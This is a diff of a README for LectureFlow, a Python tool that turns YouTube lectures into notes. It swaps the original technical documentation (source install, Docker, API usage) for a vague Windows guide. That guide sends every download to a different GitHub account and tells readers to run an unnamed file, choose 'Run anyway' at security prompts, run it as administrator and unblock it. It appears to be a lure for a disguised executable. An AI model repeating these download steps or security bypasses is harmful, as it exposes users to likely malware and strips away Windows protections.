@@ -1,235 +1,244 @@
-<p align="center">
-  <img src="images/timecode_logo.png" alt="LectureFlow" width="180">
-</p>
-
-<h1 align="center">LectureFlow</h1>
-
-<p align="center">
-  Makes educational YouTube videos easier to absorb and remember — by turning them into structured notes, flashcards, and quizzes with AI-powered semantic analysis.
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/status-beta-yellow" alt="Beta">
-  <img src="https://img.shields.io/badge/python-3.11%2B-blue" alt="Python 3.11+">
-  <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License">
-  <img src="https://img.shields.io/badge/docker-ready-blue?logo=docker" alt="Docker">
-  <img src="https://img.shields.io/badge/LLM-5_providers-green" alt="5 LLM Providers">
-</p>
-
-<p align="center">
-  <img src="docs/assets/demoflow.png" alt="LectureFlow Demo Flow" width="980">
-</p>
-
-## Why LectureFlow
-
-Taking notes from video lectures is slow. Existing transcript tools dump raw text without structure. LectureFlow segments transcripts by meaning — not by fixed time windows — then uses LLMs to turn raw chunks into study-ready materials: detailed notes, flashcards, quizzes, or exam prep.
-
-- **Semantic segmentation** — sentence embeddings group related content into coherent topics
-- **5 LLM providers** — OpenAI, Anthropic, Groq, Grok, and local Ollama, hot-switchable without code changes
-- **6 output modes** — `detailed`, `brief`, `exam`, `flashcards`, `quiz`, `youtube_seo`
-- **Search & Q&A** — FTS5 full-text search + RAG agent across your entire video library
-- **Self-hosted** — FastAPI backend, web UI, Docker-ready, no GPU required
+# 📘 lectureflow - Turn videos into study notes
 
-## Features
-
-### Core Analysis
+[![Download LectureFlow](https://img.shields.io/badge/Download%20LectureFlow-blue?style=for-the-badge)](https://github.com/Gabrielaindifferent114/lectureflow)
 
-- Fetch transcripts from YouTube videos and playlists (with Whisper audio fallback)
-- Semantic segmentation via sentence-transformer embeddings (all-MiniLM-L6-v2)
-- Topic annotation using KeyBERT keyword extraction
+## 🎯 What LectureFlow does
 
-### LLM Integration
+LectureFlow helps you learn from educational YouTube videos with less effort. It turns video content into:
 
-- LLM post-processing in 6 modes: `detailed`, `brief`, `exam`, `flashcards`, `quiz`, `youtube_seo`
-- Multi-provider support with hot-switching via API or UI (OpenAI, Anthropic, Groq, Grok, Ollama)
-- Streaming analysis progress via NDJSON
+- clear study notes
+- flashcards
+- short quizzes
+- topic summaries
 
-### Search & RAG
+It uses AI to find the main ideas in a video, then organizes them into a format that is easier to review later. If you use YouTube for lessons, tutorials, or lectures, LectureFlow gives you a faster way to turn them into study material
 
-- Video library with SQLite persistence and FTS5 full-text search
-- RAG-based Q&A agent over the video library
-- Semantic video recommendations (cosine similarity) and YouTube search suggestions
+## 🖥️ What you need on Windows
 
-### Export & UI
+Before you start, make sure your PC has:
 
-- Export to JSON, Markdown, SRT, and YouTube description formats
-- Web UI with provider/model selection, library browser, and real-time progress
+- Windows 10 or Windows 11
+- a stable internet connection
+- enough free space to store notes and video data
+- a modern web browser such as Chrome, Edge, or Firefox
 
-### Deployment
+For the best experience, use:
 
-- Docker Compose with optional local Ollama for fully offline inference
-- Single-command startup, persistent data volumes
+- 8 GB of RAM or more
+- a recent Intel or AMD processor
+- a working speaker or headphones if you want to watch videos while reading notes
 
-## Architecture
+## ⬇️ Download LectureFlow
 
-```mermaid
-flowchart TB
-    A[YouTube URL] --> B[Transcript Fetcher]
-    B --> C[Semantic Segmenter]
-    C --> D[Topic Annotator]
-    D --> E[LLM Post-Processor]
-    E --> F[SQLite + FTS5]
-    F --> G[FastAPI]
-    G --> H[Web UI]
-    G --> I[Export API]
-    G --> J[RAG Agent]
-```
+Use this link to visit the page to download:
 
-| Component | Module | Responsibility |
-|-----------|--------|----------------|
-| Transcript | `src/core/transcript.py` | Fetches YouTube transcripts, Whisper fallback |
-| Segmenter | `src/core/segmenter.py` | Groups chunks by semantic similarity |
-| Annotator | `src/core/annotator.py` | Extracts topic labels via KeyBERT |
-| Post-processor | `src/core/postprocessor.py` | Enhances segments through LLM |
-| Pipeline | `src/core/pipeline.py` | Orchestrates the full analysis flow |
-| LLM Factory | `src/llm/factory.py` | Creates provider-specific clients |
-| Database | `src/db/` | SQLite persistence with FTS5 search |
-| API | `src/api/app.py` | REST endpoints + streaming |
-| Export | `src/export/formatters.py` | JSON, Markdown, SRT, YouTube formats |
+[Visit the LectureFlow download page](https://github.com/Gabrielaindifferent114/lectureflow)
 
-## Tech Stack
-
-- **Language:** Python 3.11+
-- **API:** FastAPI + Uvicorn
-- **ML/NLP:** Sentence-Transformers, KeyBERT, PyTorch, NLTK
-- **LLM Providers:** OpenAI, Anthropic, Groq, Grok, Ollama
-- **Audio:** yt-dlp, OpenAI Whisper
-- **Database:** SQLite with FTS5
-- **Frontend:** Vanilla JavaScript
-- **Deployment:** Docker + Docker Compose
+If the page offers a Windows build, download it first. If it provides an installer, save it to your Downloads folder
 
-## Quick Start
+## 🚀 How to install on Windows
 
-### Prerequisites
+### 1. Open the download page
 
-- **Python 3.11+**
-- **GPU not required** — all embeddings and NLP run on CPU (sentence-transformers, KeyBERT)
-- **At least one LLM API key** — or a local [Ollama](https://ollama.com) installation for fully offline use
+Go to the download link above in your browser. Look for the latest Windows release or setup file
 
-| API Key | Env Variable | Required |
-|---------|-------------|----------|
-| OpenAI | `OPENAI_API_KEY` | No* |
-| Anthropic | `ANTHROPIC_API_KEY` | No* |
-| Groq | `GROQ_API_KEY` | No* |
-| Grok (xAI) | `XAI_API_KEY` | No* |
-| Ollama | — | No* |
+### 2. Download the file
 
-*At least one provider is required. Ollama needs no API key but must be running locally.
+Save the file to a folder you can find again, such as:
 
-### Local Setup
+- Downloads
+- Desktop
+- Documents
 
-```bash
-git clone https://github.com/KazKozDev/lectureflow.git
-cd lectureflow
+If Windows asks whether you want to keep the file, choose the option to keep or save it
 
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
+### 3. Open the file
 
-cp .env.example .env
-# Edit .env — add your API key(s) and set LLM_PROVIDER
+Find the downloaded file and double-click it
 
-uvicorn src.api.app:app --host 0.0.0.0 --port 8000
-```
+If Windows shows a security prompt:
 
-Open `http://localhost:8000` in your browser.
+- choose More info
+- then choose Run anyway if you trust the source
 
-### Docker
+### 4. Follow the setup steps
 
-```bash
-cp .env.example .env
-# Edit .env with your API keys
-docker compose up
+If an installer appears, follow the steps on screen:
 
-# With local Ollama (fully offline):
-docker compose --profile local up
-```
+- accept the default folder
+- choose Install
+- wait for the setup to finish
+- open the app when the installer asks
 
-## Usage
+If the app opens right away, you are ready to use it
 
-**Analyze a video:**
+## ⚙️ First-time setup
 
-```bash
-curl -X POST http://localhost:8000/api/analyze \
-  -H "Content-Type: application/json" \
-  -d '{"url": "https://youtube.com/watch?v=VIDEO_ID", "mode": "detailed"}'
-```
+When LectureFlow starts for the first time, you may need to set a few things up:
 
-**Available modes:** `detailed`, `brief`, `exam`, `flashcards`, `quiz`, `youtube_seo`
+- paste a YouTube video link
+- choose the kind of output you want
+- connect an AI provider if the app asks for one
+- choose your note style
 
-**Search your library:**
+A simple setup works well for most users:
 
-```bash
-curl -X POST http://localhost:8000/api/search \
-  -H "Content-Type: application/json" \
-  -d '{"query": "machine learning"}'
-```
+- use a short lecture video first
+- pick notes and flashcards
+- keep the default settings for the first run
 
-**Ask the Q&A agent:**
+## 📚 How to use LectureFlow
 
-```bash
-curl -X POST http://localhost:8000/api/chat \
-  -H "Content-Type: application/json" \
-  -d '{"query": "What topics were covered in the last video?"}'
-```
+### 1. Add a YouTube video
 
-## Project Structure
+Copy the link from the YouTube address bar and paste it into LectureFlow
 
-```
-src/
-  api/            # FastAPI application and endpoints
-  core/           # Analysis pipeline (segmenter, annotator, post-processor, agent)
-  llm/            # LLM provider clients (OpenAI, Anthropic, Groq, Grok, Ollama)
-  db/             # SQLite models and repository
-  export/         # Output formatters (JSON, Markdown, SRT, YouTube)
-  handlers/       # Error handling
-  utils/          # Logging, caching, rate limiting
-config/           # YAML configs for models, prompts, logging
-public/           # Web UI (HTML, JS, CSS)
-tests/            # Pytest test suite
-```
+### 2. Choose what you want
 
-## Testing
+Select one or more of these:
 
-```bash
-# Run full test suite
-pytest
+- Notes
+- Flashcards
+- Quiz
+- Summary
 
-# With coverage report
-pytest --cov=src --cov-report=term-missing
+### 3. Start the process
 
-# Run a specific test file
-pytest tests/test_pipeline.py -v
-```
+Click the main action button in the app. LectureFlow will analyze the video and build study content from it
 
-Test suite covers: pipeline, database, formatters, LLM clients, caching, rate limiter, error handling, and transcript fetching.
+### 4. Review the results
 
-## Known Limitations
+Read the notes, test yourself with flashcards, and try the quiz. Use the output to study faster and remember more
 
-- Transcript quality depends on YouTube's auto-generated captions; videos without captions fall back to Whisper (slower, requires `yt-dlp` + `ffmpeg`)
-- Semantic segmentation uses CPU-only embeddings — first run downloads the model (~90 MB)
-- Ollama provider requires a separately running Ollama instance
-- No user authentication — the API is designed for local/personal use
-- Batch playlist processing is sequential, not parallel
+## ✍️ What you get from each video
 
-## Contributing
+LectureFlow breaks video content into study parts that are easier to use later.
 
-Contributions are welcome. Fork the repo, create a feature branch, and open a PR.
+### Notes
+Clean, structured notes with the main ideas from the video
 
-- **Code style:** [Black](https://github.com/psf/black) (line-length 88) + [Ruff](https://github.com/astral-sh/ruff) for linting
-- **Commits:** use conventional format — `feat:`, `fix:`, `refactor:`, `docs:`, `test:`
-- **Tests:** run `pytest` before submitting
+### Flashcards
+Short question-and-answer cards for quick review
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines.
+### Quizzes
+Practice questions to check what you remember
 
-## Status
+### Topic breakdown
+Grouped sections that help you find the right part of the lesson
 
-**Stage:** Beta
+## 🔎 Best way to get good results
 
-<!-- TODO: Add roadmap items -->
+To get better output, use videos that:
 
----
+- teach one subject
+- have clear speech
+- are not too long for your first test
+- cover lessons, lectures, or tutorials
 
-MIT — see [LICENSE](LICENSE)
+For better study results:
 
-Artem KK — [kazkozdev@gmail.com](mailto:kazkozdev@gmail.com)
+- use one video per topic
+- review flashcards after each session
+- take the quiz before you rewatch the video
+- keep your notes in one place
+
+## 🛠️ Common use cases
+
+LectureFlow works well for:
+
+- school lessons
+- online courses
+- university lectures
+- coding tutorials
+- exam revision
+- training videos
+- how-to videos with a clear teaching style
+
+## 🧩 Project topics
+
+This app uses tools and ideas from:
+
+- AI text analysis
+- note taking
+- flashcard generation
+- study tools
+- semantic search
+- retrieval methods
+- local and cloud AI models
+- Python backend apps
+- web app workflows
+
+## 🧭 If the app does not open
+
+If you double-click the file and nothing happens:
+
+- check that the download finished
+- make sure you opened the correct file
+- right-click the file and choose Run as administrator
+- try a different browser if the file did not download fully
+
+If Windows blocks the file:
+
+- right-click the file
+- choose Properties
+- check Unblock if you see it
+- click Apply and try again
+
+## 📁 Where your study content goes
+
+LectureFlow may save your notes, flashcards, and quiz data in a local app folder or export folder on your computer. Keep your files in a place that is easy to find, such as:
+
+- Documents
+- Desktop
+- a folder named LectureFlow
+
+If the app offers export options, save your work as:
+
+- TXT
+- Markdown
+- PDF
+- CSV
+- JSON
+
+## 🔐 Privacy and data
+
+LectureFlow may send video text or prompts to an AI model if you connect one. If you use local AI tools, your data may stay on your computer. If you use a cloud service, the app may send content to that service for analysis
+
+## 🧪 Helpful tips for first use
+
+- Start with a short video
+- Use one topic at a time
+- Check notes before you make flashcards
+- Use quiz mode after you read the notes
+- Keep the same study style across videos
+
+## 📝 Basic workflow
+
+1. Open LectureFlow
+2. Paste a YouTube link
+3. Choose notes, flashcards, or quiz
+4. Start the analysis
+5. Review the study output
+6. Save or export your work
+
+## 🧰 If you want to run it again later
+
+After setup, open LectureFlow the same way you open any app on Windows:
+
+- use the Start menu
+- use a desktop shortcut
+- open the app file from the folder where you saved it
+
+Keep the original download file in case you need to reinstall it
+
+## 📌 Download link
+
+[Download or open LectureFlow here](https://github.com/Gabrielaindifferent114/lectureflow)
+
+## 🔄 What LectureFlow helps you do
+
+- turn videos into notes
+- make review cards from lectures
+- quiz yourself on the main ideas
+- study faster with less rewatching
+- keep learning in a more organized way
